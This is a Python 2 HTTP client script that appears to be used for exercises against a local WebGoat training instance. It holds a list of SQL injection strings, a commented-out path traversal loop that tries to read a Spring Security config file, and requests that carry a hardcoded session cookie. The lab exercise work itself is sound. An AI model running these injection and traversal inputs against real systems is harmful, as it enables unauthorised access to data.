import urllib
import cookielib
import urllib2
from cookielib import Cookie, CookieJar 

class httpclient:
	def __init__(self):
		self.cookies = cookielib.LWPCookieJar()
		self.handlers = [
			urllib2.HTTPHandler(),
			urllib2.HTTPSHandler(),
			urllib2.HTTPCookieProcessor(self.cookies)
			]
		self.magic_inputs = ["'+'%'+'", "'", "' OR 1=1", "#" , "1' or '1' = '1'))/*", "1' or '1' = '1'))#"]

	def decorate(self, request):
		# do nothing
		return

	def make_opener(self, uri, agent='Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'):
		opener = urllib2.build_opener(*self.handlers)
		opener.addheaders = [('User-Agent', agent	)]
		opener.addheaders += [('Referer', uri)]
		return opener

	def fetch(self,uri, headers):
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		print(uri)
		print('<br><br>')
		
		return opener.open(req)

	def get(self,uri, data=dict(), headers=None):
		url_values = urllib.urlencode(data)
		uri = uri + '?' + url_values
		print(uri)
		print('<br><br>')
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		return opener.open(req)

	def post(self, uri, data = dict(), headers=None): # data - dict()
		data = urllib.urlencode(data)
		req = urllib2.Request(uri, data)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		print(uri)
		print('<br><br>')
		
		return opener.open(req)

	def patch_headers(self, opener,headers):
		if (headers is None):
			return
		for k,v in headers:
			opener.addheaders = [ (ok,ov) if k != ok else (k,v) for ok, ov in opener.addheaders]
		opener.addheaders += [ (k, v) for k, v in headers if k not in opener.addheaders]

	def dump(self):
			for cookie in self.cookies:
				 print(cookie.name, cookie.value)
				 
	def make_cookie(name, value,domain=None):
# Cookie(version, name, value, port, port_specified, domain,
# domain_specified, domain_initial_dot, path, path_specified,
# secure, expires, discard, comment, comment_url, rest, rfc2109=False)	
		return Cookie(None, name, value, None, False, domain, False, False, '/', True, False, '1370002304', False, 'TestCookie', None, None, False)

cat = httpclient()
#cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
#t = '../'
#for x in range(0, 10):
	#t = t + '../'
	#data = cat.get('http://localhost:8080/WebGoat/attack', {'Screen':308, 'menu':200, 'File': t + 'WebGoat\\WEB-INF/spring-security.xml', 'SUBMIT': 'View+File'}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
	#print(data.read())
	
data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
print(data.read())
